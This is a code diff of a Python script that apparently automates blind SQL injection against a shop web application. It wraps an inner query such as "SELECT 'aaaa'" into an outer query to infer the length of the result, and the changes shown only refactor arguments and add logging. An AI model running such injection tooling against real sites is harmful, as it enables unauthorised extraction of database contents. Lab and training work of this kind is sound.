@@ -45,8 +45,9 @@ def format_request(url, outer_query):
     prepped = request.prepare()
     return prepped
 
-
-def determine_response_length(inner_query, shop):
+#here
+def determine_response_length(inner_query, url, no_proxy=False):
+    log.info("determinging response length")
     sess = requests.Session()
     for i in range(1, 5):
         outer_query = format_length_query(inner_query, i)
@@ -65,9 +66,11 @@ def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
     inner_query = "SELECT 'aaaa'"
-    response_length = determine_response_length(inner_query, shop)
-    
+    response_length = determine_response_length(
+        inner_query, shop.base_url, shop.no_proxy)
         
+    print(response_length)
+    #here
 
 if __name__ == "__main__":
     args = utils.parse_args(sys.argv)
